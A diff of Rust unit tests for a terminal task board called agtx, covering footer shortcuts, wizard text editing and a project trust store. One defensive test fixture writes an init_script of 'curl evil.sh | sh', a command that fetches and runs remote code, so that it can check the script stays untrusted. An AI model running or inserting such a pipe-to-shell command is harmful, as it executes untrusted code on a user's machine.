@@ -68,44 +68,40 @@ fn styled_footer_emphasizes_shortcuts_without_changing_text() {
 
 #[test]
 fn footer_groups_related_shortcuts() {
-    let text = build_footer_text(InputMode::Normal, false, 1, false, false);
-    assert!(text.contains("search  ·  [Enter] open"));
-    assert!(text.contains("[m] run  ·  [x] delete"));
+    let text = build_footer_text(None, false, 1, false, false);
+    assert!(text.contains("[d] diff  ·  [m] run"), "{text}");
+    assert!(text.contains("·  [?] help  [q] quit"), "{text}");
 }
 
+/// The footer is a summary now, not the list. It had reached 155 characters and
+/// was being truncated on a 150-column terminal, which hid whichever bindings
+/// happened to be last.
 #[test]
-fn wizard_plugin_descriptions_wrap_and_align() {
-    let lines = wizard_plugin_option_lines(
-        "  > ",
-        "agtx",
-        "A deliberately long plugin description that must stay inside the wizard",
-        " ✓",
-        Style::default(),
-        Style::default(),
-        42,
-    );
-
-    assert!(lines.len() > 1);
-    for line in &lines {
-        assert!(
-            line.width() <= 40,
-            "line reached the right margin: {:?}",
-            line
-        );
+fn every_footer_fits_a_narrow_terminal() {
+    for cyclic in [false, true] {
+        for fullscreen in [false, true] {
+            for column in 0..=4 {
+                let text = build_footer_text(None, false, column, cyclic, fullscreen);
+                assert!(
+                    text.chars().count() <= 120,
+                    "column {column} is {} chars: {text}",
+                    text.chars().count()
+                );
+            }
+        }
     }
-    let continuation: String = lines[1]
-        .spans
-        .iter()
-        .map(|span| span.content.as_ref())
-        .collect();
-    assert!(continuation.starts_with(&" ".repeat(20)));
 }
 
+/// Whatever else it drops, it always says how to find the rest.
 #[test]
-fn wizard_plugin_scroll_keeps_late_selection_visible() {
-    assert_eq!(wizard_plugin_scroll_offset(30, 10, 24..27), 17);
-    assert_eq!(wizard_plugin_scroll_offset(30, 10, 4..7), 0);
-    assert_eq!(wizard_plugin_scroll_offset(8, 10, 6..8), 0);
+fn every_footer_points_at_the_help_overlay() {
+    for cyclic in [false, true] {
+        for column in 0..=4 {
+            let text = build_footer_text(None, false, column, cyclic, false);
+            assert!(text.contains("[?] help"), "column {column}: {text}");
+        }
+    }
+    assert!(build_footer_text(None, true, 0, false, false).contains("[?] help"));
 }
 
 /// Test that generate_pr_description correctly combines git diff and agent-generated text
@@ -800,10 +796,9 @@ fn test_fuzzy_score_consecutive_bonus() {
 // =============================================================================
 // Tests for popup key translation
 //
-// These used to assert against a mock `TmuxOperations`, because a keystroke went
-// straight out as a `send-keys` subprocess. Translation is now a pure function
-// and delivery is `tmux::input`'s job, so the key names — the part agents
-// actually depend on — are pinned here without a mock in sight.
+// Translation is a pure function and delivery is `tmux::input`'s job, so the key
+// names — the part agents actually depend on — are pinned here without a mock in
+// sight.
 // =============================================================================
 
 #[cfg(test)]
@@ -878,10 +873,9 @@ fn an_unreadable_window_listing_never_marks_a_task_exited() {
     assert!(!window_is_gone(Some("pj:t1"), Some(&live)));
     assert!(window_is_gone(Some("pj:gone"), Some(&live)));
 
-    // The direction that matters. One listing now answers for every task, so a
-    // failed listing read as "no windows" would mark the whole board `Exited` —
-    // a visible, wrong status change — where the per-task check it replaced
-    // failed safe (`!window_exists(sn).unwrap_or(true)`).
+    // The direction that matters. One listing answers for every task, so a
+    // failed listing read as "no windows" would mark the whole board `Exited`:
+    // a visible, wrong status change. Unknown has to stay unknown.
     assert!(
         !window_is_gone(Some("pj:t1"), None),
         "an unreadable listing must mean unknown, not gone"
@@ -1023,11 +1017,10 @@ fn the_interval_becomes_a_rate_limit_under_push() {
 #[test]
 fn output_is_sampled_slower_than_a_keystroke_echo() {
     use std::time::Duration;
-    // The two reasons to capture deserve different answers. Sharing one made a
-    // pane painting flat out cost more than the polling it replaced: a capture
+    // The two reasons to capture deserve different answers. One shared ceiling
+    // makes a pane painting flat out cost more than polling would: a capture
     // makes the tmux server format the whole pane, so capturing every frame is
-    // expensive where nobody is watching for one. The polling had been protected
-    // by its own slowness — one `capture-pane` process per capture.
+    // expensive where nobody is watching for one.
     assert!(PANE_OUTPUT_MIN_INTERVAL > SHELL_REFRESH_INTERVAL);
 
     // Nobody is waiting on one frame of an agent's output.
@@ -1088,8 +1081,8 @@ fn the_output_watch_is_reused_only_within_one_session() {
 
 #[test]
 fn the_transition_queue_paces_itself() {
-    // A SQLite query that used to run on every housekeeping tick — ten times a
-    // second, forever, whether or not anything was connected. A transition is a
+    // A SQLite query, so it does not belong on the housekeeping tick — ten times
+    // a second, forever, whether or not anything is connected. A transition is a
     // request to move a task between columns, acted on against a phase status
     // that is itself only as fresh as its cache, so polling the queue faster
     // than that cache buys nothing.
@@ -1099,10 +1092,10 @@ fn the_transition_queue_paces_itself() {
 
 #[test]
 fn nothing_on_the_board_animates() {
-    // The `Working` indicator used to be a spinner, and on an otherwise idle
-    // board it was the *only* thing forcing a redraw — ten a second, forever, to
-    // rotate a glyph. Every indicator is now static, so a board with running
-    // tasks asks for no frame at all between real changes. If a future indicator
+    // Every indicator is static. A spinner on an otherwise idle board would be
+    // the *only* thing forcing a redraw — ten a second, forever, to rotate a
+    // glyph — so a board with running tasks asks for no frame at all between
+    // real changes. If a future indicator
     // animates, `run_housekeeping` has to start reporting a change again, and
     // the idle cost comes back with it.
     let src = include_str!("app.rs");
@@ -1188,7 +1181,7 @@ fn the_waits_release_the_lock_before_returning() {
     let watch = PaneWatch::default();
     watch.follow(Some("pj:t1"), SHELL_POPUP_TAIL_LINES);
 
-    // The arm that used to keep its guard: a poke already landed, so the wait is
+    // The arm that keeps its guard: a poke already landed, so the wait is
     // skipped entirely rather than handed to `wait_timeout`.
     watch.poke();
     let outcome = watch
@@ -1341,7 +1334,7 @@ fn the_popup_capture_prefers_the_input_connection() {
 
 /// And falls back untouched when it does not: control mode is off, the
 /// connection is down, or the queue is full. A missed capture costs one frame at
-/// the old speed, never a blank popup.
+/// the fallback's speed, never a blank popup.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn the_popup_capture_falls_back_to_the_subprocess_path() {
@@ -1780,121 +1773,20 @@ fn test_build_highlighted_text_path_is_entire_line() {
 }
 
 // =============================================================================
-// Tests for word_boundary_left / word_boundary_right
-// =============================================================================
-
-/// Test word_boundary_left from end of string
-#[test]
-fn test_word_boundary_left_from_end() {
-    assert_eq!(word_boundary_left("hello world", 11), 6);
-}
-
-/// Test word_boundary_left skips to previous word
-#[test]
-fn test_word_boundary_left_between_words() {
-    assert_eq!(word_boundary_left("hello world", 6), 0);
-}
-
-/// Test word_boundary_left from middle of word
-#[test]
-fn test_word_boundary_left_mid_word() {
-    assert_eq!(word_boundary_left("hello world", 8), 6);
-}
-
-/// Test word_boundary_left at start stays at 0
-#[test]
-fn test_word_boundary_left_at_start() {
-    assert_eq!(word_boundary_left("hello", 0), 0);
-}
-
-/// Test word_boundary_left with multiple spaces
-#[test]
-fn test_word_boundary_left_multiple_spaces() {
-    assert_eq!(word_boundary_left("hello   world", 13), 8);
-}
-
-/// Test word_boundary_left with path separators
-#[test]
-fn test_word_boundary_left_path() {
-    // From end of "src/main.rs", should jump back over "rs"
-    assert_eq!(word_boundary_left("src/main.rs", 11), 9);
-}
-
-/// Test word_boundary_right from start of string
-#[test]
-fn test_word_boundary_right_from_start() {
-    assert_eq!(word_boundary_right("hello world", 0), 6);
-}
-
-/// Test word_boundary_right from space between words
-#[test]
-fn test_word_boundary_right_from_space() {
-    assert_eq!(word_boundary_right("hello world", 5), 6);
-}
-
-/// Test word_boundary_right from middle of word
-#[test]
-fn test_word_boundary_right_mid_word() {
-    assert_eq!(word_boundary_right("hello world", 3), 6);
-}
-
-/// Test word_boundary_right at end stays at end
-#[test]
-fn test_word_boundary_right_at_end() {
-    assert_eq!(word_boundary_right("hello", 5), 5);
-}
-
-/// Test word_boundary_right with multiple spaces
-#[test]
-fn test_word_boundary_right_multiple_spaces() {
-    assert_eq!(word_boundary_right("hello   world", 0), 8);
-}
-
-/// Test word_boundary_right with path separators
-#[test]
-fn test_word_boundary_right_path() {
-    // From start of "src/main.rs", should jump over "src" then the separator
-    assert_eq!(word_boundary_right("src/main.rs", 0), 4);
-}
-
-/// Test word_boundary_left with empty string
-#[test]
-fn test_word_boundary_left_empty() {
-    assert_eq!(word_boundary_left("", 0), 0);
-}
-
-/// Test word_boundary_right with empty string
-#[test]
-fn test_word_boundary_right_empty() {
-    assert_eq!(word_boundary_right("", 0), 0);
-}
-
-/// Test word_boundary roundtrip: jumping right then left returns close to start
-#[test]
-fn test_word_boundary_roundtrip() {
-    let s = "hello world foo";
-    let pos = word_boundary_right(s, 0); // -> 6 (start of "world")
-    let pos = word_boundary_right(s, pos); // -> 12 (start of "foo")
-    let pos = word_boundary_left(s, pos); // -> 6 (start of "world")
-    let pos = word_boundary_left(s, pos); // -> 0 (start of "hello")
-    assert_eq!(pos, 0);
-}
-
-// =============================================================================
 // Tests for build_footer_text
 // =============================================================================
 
 #[test]
 fn test_footer_text_sidebar_focused() {
-    let text = build_footer_text(InputMode::Normal, true, 0, false, false);
+    let text = build_footer_text(None, true, 0, false, false);
     assert!(text.contains("[j/k] navigate"));
-    assert!(text.contains("[e] hide sidebar"));
+    assert!(text.contains("[e] hide"));
     assert!(!text.contains("[o] new"));
 }
 
 #[test]
 fn test_footer_text_backlog_column() {
-    let text = build_footer_text(InputMode::Normal, false, 0, false, false);
+    let text = build_footer_text(None, false, 0, false, false);
     assert!(text.contains("[M] run"));
     assert!(text.contains("[m] plan"));
     assert!(!text.contains("[r] move left"));
@@ -1902,7 +1794,7 @@ fn test_footer_text_backlog_column() {
 
 #[test]
 fn test_footer_text_planning_column() {
-    let text = build_footer_text(InputMode::Normal, false, 1, false, false);
+    let text = build_footer_text(None, false, 1, false, false);
     assert!(text.contains("[m] run"));
     assert!(!text.contains("[M] run"));
     assert!(!text.contains("[r] move left"));
@@ -1910,8 +1802,8 @@ fn test_footer_text_planning_column() {
 
 #[test]
 fn test_footer_text_running_column() {
-    let text = build_footer_text(InputMode::Normal, false, 2, false, false);
-    assert!(text.contains("[r] move back"));
+    let text = build_footer_text(None, false, 2, false, false);
+    assert!(text.contains("[r] back"));
     assert!(text.contains("[m] move"));
 }
 
@@ -1919,7 +1811,7 @@ fn test_footer_text_running_column() {
 fn test_footer_text_fullscreen_on_enter_hides_ctrl_f() {
     // Columns 1-3 should hide [C-f] when fullscreen_on_enter is true
     for col in 1..=3 {
-        let text = build_footer_text(InputMode::Normal, false, col, false, true);
+        let text = build_footer_text(None, false, col, false, true);
         assert!(
             !text.contains("[C-f]"),
             "Column {} should hide [C-f] when fullscreen_on_enter=true",
@@ -1928,7 +1820,7 @@ fn test_footer_text_fullscreen_on_enter_hides_ctrl_f() {
     }
     // And show it when false
     for col in 1..=3 {
-        let text = build_footer_text(InputMode::Normal, false, col, false, false);
+        let text = build_footer_text(None, false, col, false, false);
         assert!(
             text.contains("[C-f]"),
             "Column {} should show [C-f] when fullscreen_on_enter=false",
@@ -1939,14 +1831,14 @@ fn test_footer_text_fullscreen_on_enter_hides_ctrl_f() {
 
 #[test]
 fn test_footer_text_review_column() {
-    let text = build_footer_text(InputMode::Normal, false, 3, false, false);
-    assert!(text.contains("[r] move back"));
+    let text = build_footer_text(None, false, 3, false, false);
+    assert!(text.contains("[r] back"));
     assert!(text.contains("[m] move"));
 }
 
 #[test]
 fn test_footer_text_review_column_cyclic() {
-    let text = build_footer_text(InputMode::Normal, false, 3, true, false);
+    let text = build_footer_text(None, false, 3, true, false);
     assert!(text.contains("[p] next phase"));
     assert!(text.contains("[r] resume"));
     assert!(text.contains("[m] done"));
@@ -1954,7 +1846,7 @@ fn test_footer_text_review_column_cyclic() {
 
 #[test]
 fn test_footer_text_done_column() {
-    let text = build_footer_text(InputMode::Normal, false, 4, false, false);
+    let text = build_footer_text(None, false, 4, false, false);
     assert!(!text.contains("[m] move"));
     assert!(!text.contains("[r]"));
     assert!(!text.contains("[d] diff"));
@@ -1962,18 +1854,20 @@ fn test_footer_text_done_column() {
 
 #[test]
 fn test_footer_text_input_title() {
-    let text = build_footer_text(InputMode::InputTitle, false, 0, false, false);
+    let text = build_footer_text(Some(WizardStep::Title), false, 0, false, false);
     assert!(text.contains("Enter task title"));
     assert!(text.contains("[Esc] cancel"));
 }
 
 #[test]
 fn test_footer_text_input_description() {
-    let text = build_footer_text(InputMode::InputDescription, false, 0, false, false);
+    let text = build_footer_text(Some(WizardStep::Prompt), false, 0, false, false);
     assert!(text.contains("[#] files"));
     assert!(text.contains("[/] skills"));
     assert!(text.contains("[!] tasks"));
     assert!(text.contains("[\\+Enter] newline"));
+    assert!(text.contains("[S-Tab] back"));
+    assert!(text.contains("[Esc] cancel"));
 }
 
 // =============================================================================
@@ -2951,7 +2845,7 @@ fn test_bundled_plugins_list() {
 fn test_plugin_select_popup_construction_no_active() {
     // When no plugin is active, agtx should be selected
     let current = "";
-    let mut options = vec![PluginOption {
+    let mut options = vec![PickOption {
         name: String::new(),
         label: "agtx".to_string(),
         description: "Built-in workflow with skills and prompts".to_string(),
@@ -2961,7 +2855,7 @@ fn test_plugin_select_popup_construction_no_active() {
         if *name == "agtx" {
             continue;
         }
-        options.push(PluginOption {
+        options.push(PickOption {
             name: name.to_string(),
             label: name.to_string(),
             description: desc.to_string(),
@@ -2978,7 +2872,7 @@ fn test_plugin_select_popup_construction_no_active() {
 #[test]
 fn test_plugin_select_popup_construction_gsd_active() {
     let current = "gsd";
-    let mut options = vec![PluginOption {
+    let mut options = vec![PickOption {
         name: String::new(),
         label: "agtx".to_string(),
         description: "Built-in workflow with skills and prompts".to_string(),
@@ -2988,7 +2882,7 @@ fn test_plugin_select_popup_construction_gsd_active() {
         if *name == "agtx" {
             continue;
         }
-        options.push(PluginOption {
+        options.push(PickOption {
             name: name.to_string(),
             label: name.to_string(),
             description: desc.to_string(),
@@ -3074,7 +2968,7 @@ fn test_install_plugin_none_clears_config() {
 
 #[test]
 fn test_footer_text_backlog_includes_research() {
-    let text = build_footer_text(InputMode::Normal, false, 0, false, false);
+    let text = build_footer_text(None, false, 0, false, false);
     assert!(text.contains("[R] research"));
 }
 
@@ -4031,7 +3925,7 @@ fn test_determine_phase_variant_review_passthrough() {
 
 #[test]
 fn test_footer_text_review_non_cyclic_no_next_phase() {
-    let text = build_footer_text(InputMode::Normal, false, 3, false, false);
+    let text = build_footer_text(None, false, 3, false, false);
     assert!(!text.contains("[p] next phase"));
     assert!(text.contains("[m] move"));
 }
@@ -4476,9 +4370,9 @@ fn test_send_skill_and_prompt_codex_combined() {
     assert_eq!(pasted.len(), 1, "exactly one paste");
     assert!(pasted[0].contains("$agtx-plan") && pasted[0].contains("do the thing"));
 
-    // Codex used to need a second Enter to dismiss its `$skill` command picker.
-    // That picker opens on *typing*, not on a paste, so with bracketed paste there
-    // is nothing to dismiss and a second Enter would fire into an empty composer.
+    // Codex's `$skill` command picker opens on *typing*, not on a paste, so with
+    // bracketed paste there is nothing to dismiss and a second Enter would fire
+    // into an empty composer.
     // Verified against codex-cli 0.144.5.
     let calls = literal_calls.lock().unwrap();
     assert_eq!(
@@ -5014,6 +4908,115 @@ fn redirect_data_dir() -> std::sync::MutexGuard<'static, ()> {
     guard
 }
 
+/// Point `TrustStore` at a throwaway config root.
+///
+/// `App::new` reads the trust store and `install_plugin` writes it, so without
+/// the redirect the suite touches the real user's `trusted_projects.toml` and
+/// leaves entries keyed by temp dirs that are gone by the time the test
+/// returns. Same reasoning as `redirect_data_dir`, and the lock is needed for
+/// the same reason: the target is process-global.
+///
+/// Hold the returned guard for the duration of the test.
+#[cfg(feature = "test-mocks")]
+fn redirect_config_dir() -> std::sync::MutexGuard<'static, ()> {
+    static CONFIG_DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
+    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+    // A panicking test poisons the lock; the data is unit, so recover and carry on.
+    let guard = LOCK.lock().unwrap_or_else(|e| e.into_inner());
+    let dir = CONFIG_DIR.get_or_init(|| tempfile::tempdir().unwrap());
+    std::env::set_var("AGTX_CONFIG_DIR", dir.path());
+    guard
+}
+
+/// Build an App rooted at a real on-disk project directory.
+///
+/// `install_plugin` reads and writes `.agtx/config.toml` through the
+/// filesystem, so it needs a path that exists — unlike `make_test_app`, whose
+/// `/tmp/test-project` never does.
+#[cfg(feature = "test-mocks")]
+fn make_test_app_at(project: &std::path::Path) -> App {
+    let mut mock_tmux = MockTmuxOperations::new();
+    mock_tmux.expect_window_exists().returning(|_| Ok(false));
+    mock_tmux.expect_has_session().returning(|_| false);
+
+    App::new_for_test(
+        Some(project.to_path_buf()),
+        Arc::new(mock_tmux),
+        Arc::new(MockGitOperations::new()),
+        Arc::new(MockGitProviderOperations::new()),
+        Arc::new(MockAgentRegistry::new()),
+    )
+    .unwrap()
+}
+
+/// Picking a workflow plugin writes `.agtx/config.toml`, and trust *is* a hash
+/// of that file — so before the re-trust this silently untrusted the project
+/// and cost it its `init_script` on the next launch.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn install_plugin_keeps_a_trusted_project_trusted() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let project = dir.path();
+    std::fs::create_dir_all(project.join(".agtx")).unwrap();
+    std::fs::write(
+        project.join(".agtx/config.toml"),
+        "init_script = \"echo hi\"\n",
+    )
+    .unwrap();
+
+    let mut store = crate::config::TrustStore::load().unwrap();
+    store.trust_project(project).unwrap();
+    assert!(
+        store.is_trusted(project),
+        "precondition: project is trusted"
+    );
+
+    let mut app = make_test_app_at(project);
+    app.install_plugin("gsd").unwrap();
+
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(
+        store.is_trusted(project),
+        "picking a plugin must not untrust the project"
+    );
+    // And the write it was there to make actually happened.
+    let cfg = crate::config::ProjectConfig::load(project).unwrap();
+    assert_eq!(cfg.workflow_plugin.as_deref(), Some("gsd"));
+}
+
+/// The guard on the re-trust: agtx restores a decision the user already made,
+/// it never makes one. A project whose `init_script` was never vouched for must
+/// not become trusted just because agtx touched its config.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn install_plugin_does_not_trust_an_untrusted_project() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let project = dir.path();
+    std::fs::create_dir_all(project.join(".agtx")).unwrap();
+    std::fs::write(
+        project.join(".agtx/config.toml"),
+        "init_script = \"curl evil.sh | sh\"\n",
+    )
+    .unwrap();
+
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(
+        !store.is_trusted(project),
+        "precondition: never-approved config is untrusted"
+    );
+
+    let mut app = make_test_app_at(project);
+    app.install_plugin("gsd").unwrap();
+
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(
+        !store.is_trusted(project),
+        "agtx writing the config must not vouch for a script the user never approved"
+    );
+}
+
 #[test]
 fn test_write_skills_to_worktree_mcp_antigravity() {
     let dir = tempfile::tempdir().unwrap();
@@ -5364,6 +5367,81 @@ fn make_test_app() -> App {
     .unwrap()
 }
 
+/// The wizard's active text field — the title on the title step, the prompt on
+/// the prompt step. Tests assert against whichever one they opened.
+#[cfg(feature = "test-mocks")]
+fn wiz(app: &App) -> &TextInput {
+    app.state
+        .wizard
+        .as_ref()
+        .expect("no wizard open")
+        .active_input()
+        .expect("the plugin step has no text field")
+}
+
+#[cfg(feature = "test-mocks")]
+fn wiz_mut(app: &mut App) -> &mut TextInput {
+    app.state
+        .wizard
+        .as_mut()
+        .expect("no wizard open")
+        .active_input_mut()
+        .expect("the plugin step has no text field")
+}
+
+/// A wizard already filled in, for tests about `save_task` rather than about
+/// the flow that reaches it.
+#[cfg(feature = "test-mocks")]
+fn filled_wizard(
+    title: &str,
+    prompt: &str,
+    plugin: &str,
+    editing: Option<&str>,
+) -> crate::tui::wizard::WizardState {
+    let mut wizard = match editing {
+        Some(id) => crate::tui::wizard::WizardState::editing(id, title),
+        None => {
+            let mut w = crate::tui::wizard::WizardState::creating();
+            w.title.set_text(title);
+            w
+        }
+    };
+    wizard.prompt.set_text(prompt);
+    wizard.plugin.options = vec![PickOption::new(plugin, plugin, "", true)];
+    wizard.plugin.selected = 0;
+    wizard
+}
+
+/// Walk the wizard forward until it reaches `step`.
+///
+/// Which optional steps a flow includes depends on how many agents and plugins
+/// are installed, so counting `Enter` presses is brittle — a test about the
+/// prompt should not break because an agent step appeared before it.
+#[cfg(feature = "test-mocks")]
+fn advance_to(app: &mut App, step: WizardStep) {
+    for _ in 0..6 {
+        if app.state.wizard_step() == Some(step) {
+            return;
+        }
+        press_key(app, KeyCode::Enter);
+    }
+    panic!(
+        "wizard never reached {step:?}; stopped at {:?}",
+        app.state.wizard_step()
+    );
+}
+
+/// Open the wizard straight on its prompt step, for tests about the prompt
+/// itself rather than about getting there.
+#[cfg(feature = "test-mocks")]
+fn open_prompt_step(app: &mut App) {
+    let mut wizard = crate::tui::wizard::WizardState::creating();
+    wizard.title.set_text("test task");
+    wizard.advance();
+    assert_eq!(wizard.step(), WizardStep::Prompt);
+    app.state.wizard = Some(wizard);
+}
+
 /// Helper: simulate a key press on the App.
 #[cfg(feature = "test-mocks")]
 fn press_key(app: &mut App, code: KeyCode) {
@@ -5423,29 +5501,33 @@ fn test_create_task_full_flow() {
     let mut app = make_test_app();
 
     // Start in Normal mode, board is empty
-    assert_eq!(app.state.input_mode, InputMode::Normal);
+    assert_eq!(app.state.wizard_step(), None);
     assert!(app.state.board.tasks.is_empty());
 
     // Press 'o' to start task creation
     press_key(&mut app, KeyCode::Char('o'));
-    assert_eq!(app.state.input_mode, InputMode::InputTitle);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
 
     // Type a title
     type_str(&mut app, "Fix login bug");
-    assert_eq!(app.state.input_buffer, "Fix login bug");
+    assert_eq!(wiz(&app).buffer, "Fix login bug");
 
     // Press Enter to move to description
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
-    assert_eq!(app.state.pending_task_title, "Fix login bug");
-    assert!(app.state.input_buffer.is_empty());
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
+    assert_eq!(
+        app.state.wizard.as_ref().unwrap().title.as_str(),
+        "Fix login bug",
+        "the title is kept, not moved out into a side field"
+    );
+    assert!(wiz(&app).buffer.is_empty());
 
     // Type a description
     type_str(&mut app, "Users report 500 error on the login page");
 
     // Press Enter to save
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::Normal);
+    assert_eq!(app.state.wizard_step(), None);
 
     // Task should now be in the board
     assert_eq!(app.state.board.tasks.len(), 1);
@@ -5483,7 +5565,7 @@ fn test_create_task_cancel_with_esc() {
     type_str(&mut app, "Abandoned task");
     press_key(&mut app, KeyCode::Esc);
 
-    assert_eq!(app.state.input_mode, InputMode::Normal);
+    assert_eq!(app.state.wizard_step(), None);
     assert!(app.state.board.tasks.is_empty());
 }
 
@@ -5681,33 +5763,978 @@ fn test_wizard_plugin_selection() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Test task");
-    press_key(&mut app, KeyCode::Enter);
-    // Should go directly to plugin selection (multiple bundled plugins)
-    assert_eq!(app.state.input_mode, InputMode::SelectPlugin);
-    assert!(!app.state.wizard_plugin_options.is_empty());
+    advance_to(&mut app, WizardStep::Plugin);
+    assert!(!app.state.wizard.as_ref().unwrap().plugin.options.is_empty());
 
     // Navigate down
-    let initial = app.state.wizard_selected_plugin;
+    let initial = app.state.wizard.as_ref().unwrap().plugin.selected;
     press_key(&mut app, KeyCode::Char('j'));
-    assert_eq!(app.state.wizard_selected_plugin, initial + 1);
+    assert_eq!(
+        app.state.wizard.as_ref().unwrap().plugin.selected,
+        initial + 1
+    );
 
     // Advance to description
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
+}
+
+/// The wizard's text fields share one editor, reached through each handler's
+/// fallback arm. These pin the two places that ordering matters.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn alt_word_motion_in_the_title_field_moves_rather_than_typing() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "hello world");
+
+    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::ALT))
+        .unwrap();
+    assert_eq!(wiz(&app).cursor, 6);
+    assert_eq!(
+        wiz(&app).buffer,
+        "hello world",
+        "Alt+b must not insert a literal b"
+    );
+
+    app.handle_key(key_event(KeyCode::Char('f'), KeyModifiers::ALT))
+        .unwrap();
+    assert_eq!(wiz(&app).cursor, 11);
+    assert_eq!(wiz(&app).buffer, "hello world");
+}
+
+/// The prompt field gives `#`, `/` and `!` their own meanings, so its editing
+/// keys are reached through a fallback arm *below* those guards.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn editing_keys_in_the_prompt_field_survive_the_trigger_guards() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "fix the thing");
+    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::ALT))
+        .unwrap();
+    assert_eq!(wiz(&app).cursor, 8, "Alt+b lands at the start of 'thing'");
+    assert_eq!(wiz(&app).buffer, "fix the thing");
+
+    app.handle_key(key_event(KeyCode::Backspace, KeyModifiers::ALT))
+        .unwrap();
+    assert_eq!(wiz(&app).buffer, "fix thing");
+
+    press_key(&mut app, KeyCode::Home);
+    assert_eq!(wiz(&app).cursor, 0);
+    press_key(&mut app, KeyCode::End);
+    assert_eq!(wiz(&app).cursor, 9);
+    press_key(&mut app, KeyCode::Backspace);
+    assert_eq!(wiz(&app).buffer, "fix thin");
+}
+
+/// The chords that need no negotiation from the terminal. `Shift+Enter` is not
+/// among them: a bare CR is all a terminal sends for both it and Enter unless
+/// the Kitty protocol is in play, so binding it would mostly read as "save".
+#[test]
+#[cfg(feature = "test-mocks")]
+fn every_newline_chord_inserts_instead_of_saving() {
+    for (code, modifiers) in [
+        (KeyCode::Char('j'), KeyModifiers::CONTROL),
+        (KeyCode::Enter, KeyModifiers::ALT),
+    ] {
+        let mut app = make_test_app_with_agents();
+        press_key(&mut app, KeyCode::Char('o'));
+        type_str(&mut app, "Title");
+        advance_to(&mut app, WizardStep::Prompt);
+
+        type_str(&mut app, "first");
+        app.handle_key(key_event(code, modifiers)).unwrap();
+        type_str(&mut app, "second");
+
+        assert_eq!(
+            wiz(&app).as_str(),
+            "first\nsecond",
+            "{code:?}+{modifiers:?} should have inserted a newline"
+        );
+        assert_eq!(
+            app.state.wizard_step(),
+            Some(WizardStep::Prompt),
+            "{code:?}+{modifiers:?} must not submit"
+        );
+        assert!(app.state.board.tasks.is_empty());
+    }
+}
+
+/// Enter saves. A `Shift+Enter` that the terminal could not distinguish arrives
+/// here as exactly this, and saving is the honest outcome — the alternative is
+/// a binding that silently does nothing on most terminals.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_bare_enter_in_the_prompt_saves() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+    type_str(&mut app, "body");
+
+    press_key(&mut app, KeyCode::Enter);
+    assert!(app.state.wizard.is_none());
+    assert_eq!(app.state.board.tasks.len(), 1);
+}
+
+/// `Ctrl+J` moves the cursor while a picker is open; it only means "newline"
+/// when nothing has claimed it first.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn ctrl_j_navigates_an_open_picker_rather_than_inserting() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "see !");
+    assert!(app.state.task_ref_search.is_some(), "the picker is open");
+    let before = wiz(&app).as_str().to_string();
+
+    app.handle_key(key_event(KeyCode::Char('j'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(
+        wiz(&app).as_str(),
+        before,
+        "no newline, and no literal j, while the picker owns it"
+    );
+    assert!(app.state.task_ref_search.is_some(), "the picker stays open");
+}
+
+/// A chord no picker claims is not text. Before the guard, `Ctrl+X` in a picker
+/// typed a literal "x" into both the pattern and the prompt.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn an_unclaimed_chord_is_not_typed_into_a_picker() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "see !");
+    let before = wiz(&app).as_str().to_string();
+
+    for modifiers in [KeyModifiers::CONTROL, KeyModifiers::ALT] {
+        app.handle_key(key_event(KeyCode::Char('x'), modifiers))
+            .unwrap();
+    }
+    assert_eq!(wiz(&app).as_str(), before);
+    assert_eq!(
+        app.state.task_ref_search.as_ref().unwrap().pattern,
+        "",
+        "and nothing reached the search pattern either"
+    );
+}
+
+/// The backslash escape is the documented way in and the one the footer names.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_trailing_backslash_makes_a_newline() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "first\\");
+    press_key(&mut app, KeyCode::Enter);
+    type_str(&mut app, "second");
+
+    assert_eq!(wiz(&app).as_str(), "first\nsecond");
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
+}
+
+/// A terminal in Kitty mode — from the user's own shell or multiplexer, since
+/// agtx does not ask for it — reports Shift+Tab as Tab with SHIFT rather than
